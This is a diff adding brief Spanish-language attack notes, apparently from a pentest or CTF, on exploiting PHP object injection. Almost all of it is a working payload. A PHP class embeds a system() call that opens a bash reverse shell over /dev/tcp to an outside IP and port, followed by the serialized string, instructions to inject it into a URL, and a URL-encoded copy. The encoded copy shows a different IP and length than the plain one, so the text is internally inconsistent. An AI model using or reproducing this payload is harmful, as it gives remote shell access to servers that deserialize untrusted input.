@@ -1,0 +1,20 @@
+<?php
+    class PHPObjectInjection {
+        public $inject="system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";
+    }
+    $obj=new PHPObjectInjection();
+    var_dump(serialize($obj));
+?>
+
+php code.php (vemos resultado del código anterior que da la rshell).
+
+será del tipo:
+
+O:18:"PHPObjectInjection":1:{s:6:"inject";s:71:"system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";}
+
+
+ese churro lo metemos en la URL o donde corresponda, pero debemos antes pasarlo como URL encodeada.
+
+https://www.url-encode-decode.com
+
+O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A70%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.59.83.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D
